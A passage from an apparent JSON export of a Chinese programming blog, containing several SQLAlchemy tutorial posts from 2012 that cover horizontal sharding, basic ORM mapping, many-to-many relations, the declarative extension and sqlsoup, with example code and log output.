product.msrp AS product_msrp\nFROM product\n2012-07-18 19:00:59,514 INFO sqlalchemy.engine.base.Engine ()\n/usr/lib/python2.7/site-packages/SQLAlchemy-0.7.8-py2.7-linux-i686.egg/sqlalchemy/types.py:215: SAWarning: Dialect sqlite+pysqlite does *not* support Decimal objects natively, and SQLAlchemy must convert from floating point - rounding errors and other issues may occur. Please consider storing Decimal numbers as strings or integers on this platform for lossless storage.\nd[coltype] = rp = d['impl'].result_processor(dialect, coltype)\n[&lt;Product 123&gt;, &lt;Product 456&gt;, &lt;Product 789&gt;]\n&gt;&gt;&gt; session.query(ProductSummary).all() #查询ProductSummary\n2012-07-18 19:01:07,510 INFO sqlalchemy.engine.base.Engine BEGIN (implicit)\n2012-07-18 19:01:07,510 INFO sqlalchemy.engine.base.Engine SELECT product_summary.sku AS product_summary_sku, product_summary.name AS product_summary_name, product_summary.description AS product_summary_description\nFROM product_summary\n2012-07-18 19:01:07,510 INFO sqlalchemy.engine.base.Engine ()\n[&lt;ProductSummary Shoes&gt;, &lt;ProductSummary Pants&gt;, &lt;ProductSummary Shirts&gt;]</p>\n\n<p>&gt;&gt;&gt; from sqlalchemy.orm.shard import ShardedSession #使用ShardedSession对会话水平分区,根据需求把数据分开\n&gt;&gt;&gt; product_table = Table(\n...     'product', metadata,\n...     Column('sku', String(20), primary_key=True),\n...     Column('msrp', Numeric))\n&gt;&gt;&gt; metadata.create_all(bind=engine1)\n&gt;&gt;&gt; metadata.create_all(bind=engine2)\n&gt;&gt;&gt; class Product(object):\n...     def __init__(self, sku, msrp):\n...         self.sku = sku\n...         self.msrp = msrp\n...     def __repr__(self):\n...         return '&lt;Product %s&gt;' % self.sku\n...\n&gt;&gt;&gt; clear_mappers()\n&gt;&gt;&gt; product_mapper = mapper(Product, product_table)\n&gt;&gt;&gt; def shard_chooser(mapper, instance, clause=None):  #返回包含映射和实例的行的分区ID\n...     if mapper is not product_mapper: #非设定的orm映射叫做odd\n...         return 'odd'\n...     if (instance.sku  #数据为偶数也叫做even\n...         and instance.sku[0].isdigit()\n...         and int(instance.sku[0]) % 2 == 0):\n...         return 'even'\n...     else:\n...         return 'odd' #否则叫做odd\n...</p>\n\n<p>&gt;&gt;&gt; def id_chooser(query, ident):  根据查询和映射类的主键返回对象想通过查询驻留的shard ID列表\n...     if query.mapper is not product_mapper:\n...         return ['odd']\n...     if (ident \\\n...         and ident[0].isdigit()\n...         and int(ident[0]) % 2 == 0):\n...         return ['even']\n...     return ['odd']\n...\n&gt;&gt;&gt; def query_chooser(query): #返回可选的shard ID列表\n...     return ['even', 'odd']\n...\n&gt;&gt;&gt; Session = sessionmaker(class_=ShardedSession)\n&gt;&gt;&gt; session = Session(\n...     shard_chooser=shard_chooser,\n...     id_chooser=id_chooser,\n...     query_chooser=query_chooser,\n...     shards=dict(even=engine1,\n...                 odd=engine2))\n&gt;&gt;&gt; products = [ Product('%d%d%d' % (i,i,i), 0.0)\n...     for i in range(10) ]\n&gt;&gt;&gt; for p in products:\n...     session.add(p)\n...\n&gt;&gt;&gt; session.flush()\n&gt;&gt;&gt; for row in engine1.execute(product_table.select()):\n...     print row\n...\n2012-07-18 19:11:19,811 INFO sqlalchemy.engine.base.Engine SELECT product.sku, product.msrp\nFROM product\n2012-07-18 19:11:19,811 INFO sqlalchemy.engine.base.Engine ()\n(u'000', Decimal('0E-10')) #偶数数据写在engine1\n(u'222', Decimal('0E-10'))\n(u'444', Decimal('0E-10'))\n(u'666', Decimal('0E-10'))\n(u'888', Decimal('0E-10'))\n&gt;&gt;&gt; for row in engine2.execute(product_table.select()):\n...     print row\n...\n2012-07-18 19:11:40,098 INFO sqlalchemy.engine.base.Engine SELECT product.sku, product.msrp\nFROM product\n2012-07-18 19:11:40,099 INFO sqlalchemy.engine.base.Engine ()\n(u'111', Decimal('0E-10')) #奇数数据写在engine1\n(u'333', Decimal('0E-10'))\n(u'555', Decimal('0E-10'))\n(u'777', Decimal('0E-10'))\n(u'999', Decimal('0E-10'))\n&gt;&gt;&gt; session.query(Product).all()\n2012-07-18 19:12:36,130 INFO sqlalchemy.engine.base.Engine SELECT product.sku AS product_sku, product.msrp AS product_msrp\nFROM product\n2012-07-18 19:12:36,130 INFO sqlalchemy.engine.base.Engine ()\n2012-07-18 19:12:36,131 INFO sqlalchemy.engine.base.Engine SELECT product.sku AS product_sku, product.msrp AS product_msrp\nFROM product\n2012-07-18 19:12:36,131 INFO sqlalchemy.engine.base.Engine ()\n[&lt;Product 123&gt;, &lt;Product 456&gt;, &lt;Product 789&gt;, &lt;Product 000&gt;, &lt;Product 222&gt;, &lt;Product 444&gt;, &lt;Product 666&gt;, &lt;Product 888&gt;, &lt;Product 111&gt;, &lt;Product 333&gt;, &lt;Product 555&gt;, &lt;Product 777&gt;, &lt;Product 999&gt;]</p>\n\n<p>from sqlalchemy import create_engine\nfrom sqlalchemy.orm import mapper, sessionmaker\nfrom datetime import datetime\nfrom sqlalchemy import Numeric,Table, MetaData, Column, ForeignKey, Integer, String, Unicode, DateTime\nfrom sqlalchemy import types\nfrom sqlalchemy.databases import sqlite\nengine1 = create_engine('sqlite://')\nengine2 = create_engine('sqlite://')\nmetadata = MetaData()\nproduct_table = Table(\n'product', metadata,\nColumn('sku', String(20), primary_key=True),\nColumn('msrp', Numeric))\nproduct_summary_table = Table(\n'product_summary', metadata,\nColumn('sku', String(20), ForeignKey('product.sku'), primary_key=True),\nColumn('name', Unicode(255)),\nColumn('description', Unicode))\nproduct_table.create(bind=engine1)\nproduct_summary_table.create(bind=engine2)\nstmt = product_table.insert()\nengine1.execute(\nstmt,\n[dict(sku=\"123\", msrp=12.34),\ndict(sku=\"456\", msrp=22.12),\ndict(sku=\"789\", msrp=41.44)])\nstmt = product_summary_table.insert()\nengine2.execute(\nstmt,\n[dict(sku=\"123\", name=\"Shoes\", description=\"Some Shoes\"),\ndict(sku=\"456\", name=\"Pants\", description=\"Some Pants\"),\ndict(sku=\"789\", name=\"Shirts\", description=\"Some Shirts\")])</p>\n",
    "date": {
      "year": "2012",
      "month": "July",
      "day": "17"
    }
  },
  {
    "id": 241,
    "title": "SQLAlchemy教程(一)",
    "category": "python",
    "tags": [
      "SQLAlchemy"
    ],
    "url": "/archives/sqlalchemyjiaochengyi/",
    "content": "<p>前言:最近开始学习SQLAlchemy,本教程是其官方文档以及在读英文版&lt;Essential SQLAlchemy&gt;的翻译加一些自己的理解和总结</p>\n\n<p>1 什么是 SQLAlchemy?</p>\n\n<p>它是给mysql, oracle,sqlite等关系型数据库的python接口,不需要大幅修改原有的python代码,它已经包含了SQL表达式语言和ORM,看一些例子:</p>\n\n<p>sql=\"INSERT INTO user(user_name, password) VALUES (%s, %s)\"\ncursor = conn.cursor()\ncursor.execute(sql, ('dongwm', 'testpass'))</p>\n\n<p>以上是一个常用的mysql的SQL语句,但是冗长也容易出错,并且可能导致安全问题(因为是字符串的语句,会存在SQL注入),并且代码不跨平台,在不同数据库软件的语句不同(以下是一个 Oracle例子),不具备客移植性:</p>\n\n<p>sql=\"INSERT INTO user(user_name, password) VALUES (:1, :2)\"\ncursor = conn.cursor()\ncursor.execute(sql, 'dongwm', 'testpass')</p>\n\n<p>而在SQLAlchemy里只需要这样写:</p>\n\n<p>statement = user_table.insert(user_name='rick', password='parrot')\nstatement.execute()  #护略是什么数据库环境</p>\n\n<p>SQLAlchemy还能让你写出很pythonic的语句:</p>\n\n<p>statement = user_table.select(and_(\nuser_table.c.created &gt;= date(2007,1,1),\nuser_table.c.created &lt; date(2008,1,1))\nresult = statement.execute()  #检索所有在2007年创建的用户</p>\n\n<p>metadata=MetaData('sqlite://') # 告诉它你设置的数据库类型是基于内存的sqlite\nuser_table = Table(  #创建一个表\n'tf_user', metadata,\nColumn('id', Integer, primary_key=True),  #一些字段,假设你懂SQL,那么以下的字段很好理解\nColumn('user_name', Unicode(16), unique=True, nullable=False),\nColumn('email_address', Unicode(255), unique=True, nullable=False),\nColumn('password', Unicode(40), nullable=False),\nColumn('first_name', Unicode(255), default=''),\nColumn('last_name', Unicode(255), default=''),\nColumn('created', DateTime, default=datetime.now))</p>\n\n<p>users_table = Table('users', metadata, autoload=True) #假设table已经存在.就不需要指定字段,只是加个autoload=True</p>\n\n<p>class User(object): pass  #虽然SQLAlchemy强大,但是插入更新还是需要手动指定,可以使用ORM,方法就是:设定一个类,定义一个表,把表映射到类里面\nmapper(User, user_table)</p>\n\n<p>下面是一个完整ORM的例子:</p>\n\n<p><pre class=\"sh_python\">\nfrom sqlalchemy.orm import mapper, sessionmaker #sessionmaker() 函数是最常使用的创建最顶层可用于整个应用 Session 的方法,Session 管理着所有与数据库之间的会话\nfrom datetime import datetime\nfrom sqlalchemy import Table, MetaData, Column, ForeignKey, Integer, String, Unicode, DateTime #会SQL的人能理解这些函数吧?\nengine = create_engine(\"sqlite:///tutorial.db\", echo=True) #创建到数据库的连接,echo=True 表示用logging输出调试结果\nmetadata = MetaData() #跟踪表属性\nuser_table = Table( #创建一个表所需的信息:字段,表名等\n'tf_user', metadata,\nColumn('id', Integer, primary_key=True),\nColumn('user_name', Unicode(16), unique=True, nullable=False),\nColumn('email_address', Unicode(255), unique=True, nullable=False),\nColumn('password', Unicode(40), nullable=False),\nColumn('first_name', Unicode(255), default=''),\nColumn('last_name', Unicode(255), default=''),\nColumn('created', DateTime, default=datetime.now))\nmetadata.create_all(engine)  #在数据库中生成表\nclass User(object): pass #创建一个映射类\nmapper(User, user_table) #把表映射到类\nSession = sessionmaker() #创建了一个自定义了的 Session类\nSession.configure(bind=engine)  #将创建的数据库连接关联到这个session\nsession = Session()\nu = User()\nu.user_name='dongwm'\nu.email_address='dongwm@dongwm.com'\nu.password='testpass'  #给映射类添加以下必要的属性,因为上面创建表指定这几个字段不能为空\nsession.add(u)  #在session中添加内容</p>\n\n<p>session.flush() #保存数据\nsession.commit() #数据库事务的提交,sisson自动过期而不需要关闭</p>\n\n<p>query = session.query(User) #query() 简单的理解就是select() 的支持 ORM 的替代方法,可以接受任意组合的 class/column 表达式\nprint list(query) #列出所有user\nprint query.get(1) #根据主键显示\nprint query.filter_by(user_name='dongwm').first()  #类似于SQL的where,打印其中的第一个\nu = query.filter_by(user_name='dongwm').first()\nu.password = 'newpass' #修改其密码字段\nsession.commit() #提交事务\nprint query.get(1).password #打印会出现新密码</p>\n\n<p>for instance in session.query(User).order_by(User.id):  #根据id字段排序,打印其中的用户名和邮箱地址\n    print instance.user_name, instance.email_address\n</pre></p>\n\n<p>既然是ORM框架,我们来一个更复杂的包含关系的例子,先看sql语句:</p>\n\n<p>CREATE TABLE tf_user (\nid INTEGER NOT NULL,\nuser_name VARCHAR(16) NOT NULL,\nemail_address VARCHAR(255) NOT NULL,\npassword VARCHAR(40) NOT NULL,\nfirst_name VARCHAR(255),\nlast_name VARCHAR(255),\ncreated TIMESTAMP,\nPRIMARY KEY (id),\nUNIQUE (user_name),\nUNIQUE (email_address));\nCREATE TABLE tf_group (\nid INTEGER NOT NULL,\ngroup_name VARCHAR(16) NOT NULL,\nPRIMARY KEY (id),\nUNIQUE (group_name));\nCREATE TABLE tf_permission (\nid INTEGER NOT NULL,\npermission_name VARCHAR(16) NOT NULL,\nPRIMARY KEY (id),\nUNIQUE (permission_name));\nCREATE TABLE user_group (\nuser_id INTEGER,\ngroup_id INTEGER,\nPRIMARY KEY(user_id, group_id),\nFOREIGN KEY(user_id) REFERENCES tf_user (id), #user_group的user_id关联了tf_user的id字段\nFOREIGN KEY(group_id) REFERENCES tf_group (id));  #group_id关联了 tf_group 的id字段</p>\n\n<p>CREATE TABLE group_permission (\ngroup_id INTEGER,\npermission_id INTEGER,\nPRIMARY KEY(group_id, permission_id),\nFOREIGN KEY(group_id) REFERENCES tf_group (id),  #group_permission的id关联 tf_group的id字段\nFOREIGN KEY(permission_id) REFERENCES tf_permission (id)); #permission_id关联了tf_permission 的id字段</p>\n\n<p>这是一个复杂的多对多的关系,比如检查用户是否有admin权限,sql需要这样:</p>\n\n<p>SELECT COUNT(*) FROM tf_user, tf_group, tf_permission WHERE\ntf_user.user_name='dongwm' AND tf_user.id=user_group.user_id\nAND user_group.group_id = group_permission.group_id\nAND group_permission.permission_id = tf_permission.id\nAND permission_name='admin';  看起来太复杂并且繁长了</p>\n\n<p>在面向对象的世界里,是这样的:</p>\n\n<p>class User(object):\ngroups=[]\nclass Group(object):\nusers=[]\npermissions=[]\nclass Permission(object):\ngroups=[]</p>\n\n<p><pre class=\"sh_python\">\nprint 'Summary for %s' % user.user_name\nfor g in user.groups:\n    print ' Member of group %s' % g.group_name\n    for p in g.permissions:\n        print '... which has permission %s' % p.permission_name\n</pre></p>\n\n<p>&nbsp;</p>\n\n<p><pre class=\"sh_python\">\ndef user_has_permission(user, permission_name):  #检查用户是否有permission_name的权限的函数\n    for g in user.groups:\n        for p in g.permissions: #可以看出来使用了for循环\n            if p.permission_name == 'admin':\n                return True\n    return False\n</pre></p>\n\n<p>而在SQLAlchemy中,这样做:</p>\n\n<p>mapper(User, user_table, properties=dict(\ngroups=relation(Group, secondary=user_group, backref='users'))) #properties是一个字典值。增加了一个groups 值，它又是一个 relation 对象，这个对象实现</p>\n\n<p>#了Group类与user_group的  映射。这样我通过user_table的groups 属性就可以反映出RssFeed的值来,</p>\n\n<p>#中间表对象(user_group)传给secondary参数，backref为自己的表(users)\nmapper(Group, group_table, properties=dict(\npermissions=relation(Permission, secondary=group_permission,\nbackref='groups')))\nmapper(Permission, permission_table)</p>\n\n<p>&nbsp;</p>\n\n<p>q = session.query(Permission)\ndongwm_is_admin = q.count_by(permission_name='admin',user_name='dongwm')</p>\n\n<p>假如计算组里用户数(不包含忘记删除但是重复的)</p>\n\n<p>for p in permissions:\nusers = set()\nfor g in p.groups:\nfor u in g.users:\nusers.add(u)\nprint 'Permission %s has %d users' % (p.permission_name, len(users))</p>\n\n<p>在SQLAlchemy可以这样:</p>\n\n<p>q=select([Permission.c.permission_name,\nfunc.count(user_group.c.user_id)],\nand_(Permission.c.id==group_permission.c.permission_id,\nGroup.c.id==group_permission.c.group_id,\nGroup.c.id==user_group.c.group_id),\ngroup_by=[Permission.c.permission_name],\ndistinct=True)\nrs=q.execute()\nfor permission_name, num_users in q.execute():\nprint 'Permission %s has %d users' % (permission_name, num_users) #虽然也长,但是减少了数据库查询次数,也就是让简单事情简单化,复杂事情可能简单解决</p>\n\n<p>看一个综合的例子:</p>\n\n<p>class User(object):  #这些类设计数据库的模型</p>\n\n<p>def __init__(self, group_name=None, users=None, permissions=None):\nif users is None: users = []\nif permissions is None: permissions = []\nself.group_name = group_name\nself._users = users\nself._permissions = permissions</p>\n\n<p>def add_user(self, user):\nself._users.append(user)</p>\n\n<p>def del_user(self, user):\nself._users.remove(user)</p>\n\n<p>def add_permission(self, permission):\nself._permissions.append(permission)</p>\n\n<p>def del_permission(self, permission):\nself._permissions.remove(permission)</p>\n\n<p>class Permission(object):</p>\n\n<p>def __init__(self, permission_name=None, groups=None):\nself.permission_name = permission_name\nself._groups = groups</p>\n\n<p>def join_group(self, group):\nself._groups.append(group)</p>\n\n<p>def leave_group(self, group):\nself._groups.remove(group)</p>\n\n<p>用sqlalchemy的效果是这样的:</p>\n\n<p>user_table = Table(\n'tf_user', metadata,\nColumn('id', Integer, primary_key=True),\nColumn('user_name', Unicode(16), unique=True, nullable=False),\nColumn('password', Unicode(40), nullable=False))</p>\n\n<p>group_table = Table(\n'tf_group', metadata,\nColumn('id', Integer, primary_key=True),\nColumn('group_name', Unicode(16), unique=True, nullable=False))</p>\n\n<p>permission_table = Table(\n'tf_permission', metadata,\nColumn('id', Integer, primary_key=True),\nColumn('permission_name', Unicode(16), unique=True,\nnullable=False))</p>\n\n<p>user_group = Table(\n'user_group',  metadata,\nColumn('user_id', None, ForeignKey('tf_user.id'),\nprimary_key=True),\nColumn('group_id', None, ForeignKey('tf_group.id'),\nprimary_key=True))</p>\n\n<p>group_permission = Table(\n'group_permission',  metadata,\nColumn('group_id', None, ForeignKey('tf_group.id'),\nprimary_key=True),\nColumn('permission_id', None, ForeignKey('tf_permission.id'),\nprimary_key=True))</p>\n\n<p>mapper(User, user_table, properties=dict(\n_groups=relation(Group, secondary=user_group, backref='_users')))\nmapper(Group, group_table, properties=dict(\n_permissions=relation(Permission, secondary=group_permission,\nbackref=_'groups')))\nmapper(Permission, permission_table)</p>\n\n<p>这里没有修改对象,而join_group,leave_group这样的函数依然可用,sqlalchemy会跟踪变化,并且自动刷新数据库</p>\n\n<p>上面介绍了一个完整的例子,连接数据库嗨可以这样:</p>\n\n<p>engine = create_engine('sqlite://')\nconnection = engine.connect()  #使用connect\nresult = connection.execute(\"select user_name from tf_user\")\nfor row in result:\nprint 'user name: %s' % row['user_name']\nresult.close()</p>\n\n<p>engine = create_engine('sqlite://', strategy='threadlocal')  #,strategy='threadlocal'表示重用其它本地线程减少对数据库的访问</p>\n\n<p>from sqlalchemy.databases.mysql import MSEnum, MSBigInteger  #这个 sqlalchemy.databases是某数据库软件的'方言'集合,只支持特定平台\nuser_table = Table('tf_user', meta,\nColumn('id', MSBigInteger),\nColumn('honorific', MSEnum('Mr', 'Mrs', 'Ms', 'Miss', 'Dr', 'Prof')))</p>\n\n<p>以下是几个MetaData的应用:\nunbound_meta = MetaData()  #这个metadata没有绑定\ndb1 = create_engine('sqlite://')\nunbound_meta.bind = db1  #关联引擎</p>\n\n<p>db2 = MetaData('sqlite:///test1.db')  #直接设置引擎\nbound_meta1 = MetaData(db2)</p>\n\n<p># Create a bound MetaData with an implicitly created engine\nbound_meta2 = MetaData('sqlite:///test2.db')  #隐式绑定引擎\nmeta = MetaData('sqlite://') #直接绑定引擎可以让源数据直接访问数据库</p>\n\n<p>user_table = Table(\n'tf_user', meta,\nColumn('id', Integer, primary_key=True),\nColumn('user_name', Unicode(16), unique=True, nullable=False),\nColumn('password', Unicode(40), nullable=False))</p>\n\n<p>group_table = Table(\n'tf_group', meta,\nColumn('id', Integer, primary_key=True),\nColumn('group_name', Unicode(16), unique=True, nullable=False))</p>\n\n<p>meta.create_all() #创建所有的数据库(以上2个),函数无参数</p>\n\n<p>result_set = group_table.select().execute() #选取 group_table的所有表数据</p>\n\n<p>以下看一个关联多引擎的例子:</p>\n\n<p>meta = MetaData()  #这里不能直接关联了\nengine1 = create_engine('sqlite:///test1.db')  #2个引擎\nengine2 = create_engine('sqlite:///test2.db')</p>\n\n<p># Use the engine parameter to load tables from the first engineuser_table = Table(\n'tf_user', meta, autoload=True, autoload_with=engine1)  #从第一个引擎加载这些表\ngroup_table = Table(\n'tf_group', meta, autoload=True, autoload_with=engine1)\npermission_table = Table(\n'tf_permission', meta, autoload=True, autoload_with=engine1)\nuser_group_table = Table(\n'user_group', meta, autoload=True, autoload_with=engine1)\ngroup_permission_table = Table(\n'group_permission', meta, autoload=True, autoload_with=engine1)</p>\n\n<p>meta.create_all(engine2) #在第二个引擎里面创建表</p>\n\n<p>class ImageType(sqlalchemy.types.Binary):  #自定义我们的table的类\ndef convert_bind_param(self, value, engine):\nsfp = StringIO()\nvalue.save(sfp, 'JPEG')\nreturn sfp.getvalue()\ndef convert_result_value(self, value, engine):\nsfp = StringIO(value)\nimage = PIL.Image.open(sfp)\nreturn image  #这里我们定义了一个图形处理的类型</p>\n\n<p>当定义了metadata后,会自定生成一个table.c object:\nq = user_table.select(  #查询创建在2007年6月1号之前的用户,并且第一个字母是'r'\nuser_table.c.user_name.like('r%')  #这里的c就是那个特殊的类,当使用sql表达式会用到\n&amp; user_table.c.created &lt; datetime(2007,6,1))\n或者替代这样:\nq = user_table.select(and_(\nuser_table.c.user_name.like('r%'),\nuser_table.c.created &lt; datetime(2007,6,1)))\n也可以使用rom映射:\nq = session.query(User)\nq = q.filter(User.c.user_name.like('r%')\n&amp; User.c.created &gt; datetime(2007,6,1))</p>\n\n<p>还是一个ORM的例子:</p>\n\n<p>user_table = Table(\n'tf_user', metadata,\nColumn('id', Integer, primary_key=True),\nColumn('user_name', Unicode(16), unique=True, nullable=False),\nColumn('email_address', Unicode(255), unique=True, nullable=False),\nColumn('password', Unicode(40), nullable=False),\nColumn('first_name', Unicode(255), default=''),\nColumn('last_name', Unicode(255), default=''),\nColumn('created', DateTime, default=datetime.now))  #这是一个定义的表类型</p>\n\n<p>group_table = Table(\n'tf_group', metadata,\nColumn('id', Integer, primary_key=True),\nColumn('group_name', Unicode(16), unique=True, nullable=False))</p>\n\n<p>user_group = Table(\n'user_group',  metadata,\nColumn('user_id', None, ForeignKey('tf_user.id'), primary_key=True),\nColumn('group_id', None, ForeignKey('tf_group.id'),\n... primary_key=True))</p>\n\n<p>import sha\nclass User(object):  #映射类</p>\n\n<p>def _get_password(self):\nreturn self._password\ndef _set_password(self, value):\nself._password = sha.new(value).hexdigest() #只存储用户的哈希密码\npassword=property(_get_password, _set_password)</p>\n\n<p>def password_matches(self, password):\nreturn sha.new(password).hexdigest() == self._password</p>\n\n<p>mapper(User, user_table, properties=dict( #映射将创建id, user_name, email_address, password, first_name, last_name, created等字段\n_password=user_table.c.password)) #使用哈希后的密码替换真实密码,数据库只保存哈希后的,这里在orm上修改</p>\n\n<p>mapper(User, user_table, properties=dict(\n_password=user_table.c.password,\ngroups=relation(Group, secondary=user_group, backref='users'))) #这里表示可以访问所有的组，用户只需访问一个成员团体属性,user_group映射类添加group和Group关联,</p>\n\n<p># User类添加users访问group属性,看效果:\ngroup1.users.append(user1)  #给group1添加用户user1,自动更新\nuser2.groups.append(group2) #把user2添加到group2组,自动更新</p>\n",
    "date": {
      "year": "2012",
      "month": "July",
      "day": "17"
    }
  },
  {
    "id": 242,
    "title": "SQLAlchemy教程(八)",
    "category": "python",
    "tags": [
      "SQLAlchemy"
    ],
    "url": "/archives/sqlalchemyjiaochengba/",
    "content": "<p><strong>本文主要是讲关于sqlalchemy的扩展</strong></p>\n\n<p>扩展其实就是一些外部的插件,比如sqlsoup,associationproxy,declarative,horizontal_shard等等</p>\n\n<p><strong>1 declarative</strong></p>\n\n<p>假如想要数据映射,以前的做法是:</p>\n\n<p><pre class=\"sh_python\">\nfrom sqlalchemy import create_engine\nfrom sqlalchemy import Column, MetaData, Table\nfrom sqlalchemy import Integer, String, ForeignKey\nfrom sqlalchemy.orm import mapper, sessionmaker</p>\n\n<p>class User(object): #简单类\n    def __init__(self, name, fullname, password):\n        self.name = name\n        self.fullname = fullname\n        self.password = password\n    def __repr__(self):\n        return \"&lt;User('%s','%s', '%s')&gt;\" % (self.name, self.fullname, self.password)\nmetadata = MetaData()\nusers_table = Table('users', metadata,\nColumn('user_id', Integer, primary_key=True),\nColumn('name', String),\nColumn('fullname', String),\nColumn('password', String)\n)\nemail_table = Table('email', metadata,\nColumn('email_id', Integer, primary_key=True),\nColumn('email_address', String),\nColumn('user_id', Integer, ForeignKey('users.user_id'))\n)\nmetadata.create_all(engine)</p>\n\n<p>mapper(User, users_table) #映射\n</pre></p>\n\n<p>但是我们可以该换风格,可以用这样的方法:</p>\n\n<p><pre class=\"sh_python\">\nfrom sqlalchemy import Column, Integer, String, ForeignKey\nfrom sqlalchemy import create_engine\nfrom sqlalchemy.ext.declarative import declarative_base\nfrom sqlalchemy.orm import backref, mapper, relation, sessionmaker</p>\n\n<p>Base = declarative_base()</p>\n\n<p>class User(Base):\n    __tablename__ = \"users\" #设定接收映射的表名\n    id = Column(Integer, primary_key=True) #将表结构写到类里面\n    name = Column(String)\n    fullname = Column(String)\n    password = Column(String)\n    def __init__(self, name, fullname, password):\n        self.name = name\n        self.fullname = fullname\n        self.password = password\n    def __repr__(self):\n        return \"&lt;User('%s','%s', '%s')&gt;\" % (self.name, self.fullname, self.password)</p>\n\n<p>class Address(Base):\n    __tablename__ = \"addresses\"\n    id = Column(Integer, primary_key=True)\n    email_address = Column(String, nullable=False)\n    user_id = Column(Integer, ForeignKey('users.id'))\n    user = relation(User, backref=backref('addresses', order_by=id)) #创建双向关系,标识以user的id为连接,也就是说:Address到User是多对一,User到Address是一对多\n    def __init__(self, email_address):\n        self.email_address = email_address\n    def __repr__(self):\n        return \"&lt;Address('%s')&gt;\" % self.email_address\nengine = create_engine(\"sqlite:///tutorial.db\", echo=True)</p>\n\n<p>users_table = User.__table__ #获取User表对象句柄\nmetadata = Base.metadata #获取metadata句柄\nmetadata.create_all(engine)\n</pre></p>\n\n<p>下面具体说:</p>\n\n<p>engine = create_engine('sqlite://') #创建引擎\nBase.metadata.create_all(engine) #常见表\nBase.metadata.bind = create_engine('sqlite://') #绑定\nBase = declarative_base(bind=create_engine('sqlite://')) #绑定引擎\nmymetadata = MetaData()\nBase = declarative_base(metadata=mymetadata) #设定元数据<strong>设定简单关系:</strong>\nclass User(Base):\n__tablename__ = 'users'id = Column(Integer, primary_key=True)\nname = Column(String(50))\naddresses = relationship(\"Address\", backref=\"user\") #relationship其实就是relation的全称</p>\n\n<p>class Address(Base):\n__tablename__ = 'addresses'</p>\n\n<p>id = Column(Integer, primary_key=True)\nemail = Column(String(50))\nuser_id = Column(Integer, ForeignKey('users.id'))\n<strong>设定多对多关系:</strong>\nkeywords = Table(\n'keywords', Base.metadata,\nColumn('author_id', Integer, ForeignKey('authors.id')),\nColumn('keyword_id', Integer, ForeignKey('keywords.id'))\n)\nclass Author(Base):\n__tablename__ = 'authors'\nid = Column(Integer, primary_key=True)\nkeywords = relationship(\"Keyword\", secondary=keywords)\n<strong>定义SQL表达式:</strong>\nclass MyClass(Base):\n__tablename__ = 'sometable'\n__table_args__ = {'mysql_engine':'InnoDB'} #名字,映射类,元数据之外的指定需要使用__table_args__</p>\n\n<p>或者:\nclass MyClass(Base):\n__tablename__ = 'sometable'\n__table_args__ = (\nForeignKeyConstraint(['id'], ['remote_table.id']), #元组方式\nUniqueConstraint('foo'),\n)</p>\n\n<p>或者:\nclass MyClass(Base):\n__tablename__ = 'sometable'\n__table_args__ = (\nForeignKeyConstraint(['id'], ['remote_table.id']),\nUniqueConstraint('foo'),\n{'autoload':True} #最后的参数可以用字典 想想*argsand **kwargs\n)\n<strong>使用混合式:</strong>\nclass MyClass(Base):\n__table__ = Table('my_table', Base.metadata, #在__table__里指定表结构\nColumn('id', Integer, primary_key=True),\nColumn('name', String(50))\n)\n<strong>2 sqlsoup(在sqlalchemy0.8版本后他变成了一个独立的项目,http://pypi.python.org/pypi/sqlsoup,</strong></p>\n\n<p><strong>而我使用gentoo提供的0.7.8版本,以下的程序import部分可能不适用更高版本,而需要import sqlsoup)</strong></p>\n\n<p>sqlsoup提供一个方便的访问数据库的接方式,而无需创建类,映射数据库</p>\n\n<p>还是看例子的对比:</p>\n\n<p>用以前的方式创建一个数据库并且插入一些数据:</p>\n\n<p>&gt;&gt;&gt; from sqlalchemy import *\n&gt;&gt;&gt; engine = create_engine('sqlite:///dongwm.db')\n&gt;&gt;&gt; metadata = MetaData(engine)\n&gt;&gt;&gt; product_table = Table(\n...     'product', metadata,\n...     Column('sku', String(20), primary_key=True),\n...     Column('msrp', Numeric))\n&gt;&gt;&gt; store_table = Table(\n...     'store', metadata,\n...     Column('id', Integer, primary_key=True),\n...     Column('name', Unicode(255)))\n&gt;&gt;&gt; product_price_table = Table(\n...     'product_price', metadata,\n... Column('sku2', None, ForeignKey('product.sku'), primary_key=True),\n... Column('store_id', None, ForeignKey('store.id'), primary_key=True),\n...     Column('price', Numeric, default=0))\n&gt;&gt;&gt; metadata.create_all()\n&gt;&gt;&gt; stmt = product_table.insert()\n&gt;&gt;&gt; stmt.execute([dict(sku=\"123\", msrp=12.34),\n...               dict(sku=\"456\", msrp=22.12),\n...               dict(sku=\"789\", msrp=41.44)])\n&lt;sqlalchemy.engine.base.ResultProxy object at 0x84fbdcc&gt;\n&gt;&gt;&gt; stmt = store_table.insert()\n&gt;&gt;&gt; stmt.execute([dict(name=\"Main Store\"),\n...               dict(name=\"Secondary Store\")])\n&lt;sqlalchemy.engine.base.ResultProxy object at 0x850068c&gt;\n&gt;&gt;&gt; stmt = product_price_table.insert()\n&gt;&gt;&gt; stmt.execute([dict(store_id=1, sku=\"123\"),\n...               dict(store_id=1, sku2=\"456\"),\n...               dict(store_id=1, sku2=\"789\"),\n...               dict(store_id=2, sku2=\"123\"),\n...               dict(store_id=2, sku2=\"456\"),\n...               dict(store_id=2, sku2=\"789\")])\n&lt;sqlalchemy.engine.base.ResultProxy object at 0x85008cc&gt;\n创建插入完毕,然后我们用sqlsoup连接操作:</p>\n\n<p>&gt;&gt;&gt; from sqlalchemy.ext.sqlsoup import SqlSoup\n&gt;&gt;&gt; db = SqlSoup('sqlite:///dongwm.db')  #连接一个存在的数据库\n&gt;&gt;&gt; print db.product.all() #打印结果\n[MappedProduct(sku=u'123',msrp=Decimal('12.3400000000')), MappedProduct(sku=u'456',msrp=Decimal('22.1200000000')), MappedProduct(sku=u'789',msrp=Decimal('41.4400000000'))]\n&gt;&gt;&gt; print db.product.get('123') #是不是比session.query(Product)简单呢?\nMappedProduct(sku=u'123',msrp=Decimal('12.3400000000'))</p>\n\n<p>注:假如想创建一个数据库: db = SqlSoup('sqlite:///:memory:')</p>\n\n<p>&gt;&gt;&gt; newprod = db.product.insert(sku='111', msrp=22.44) #没有使用数据映射的插入\n&gt;&gt;&gt; db.flush()\n&gt;&gt;&gt; db.clear() #调用底层,清除所有session实例,它是session.expunge_all的别名\n&gt;&gt;&gt; db.product.all()\n[MappedProduct(sku=u'123',msrp=Decimal('12.3400000000')), MappedProduct(sku=u'456',msrp=Decimal('22.1200000000')), MappedProduct(sku=u'789',msrp=Decimal('41.4400000000')), MappedProduct(sku=u'111',msrp=Decimal('22.4400000000'))] 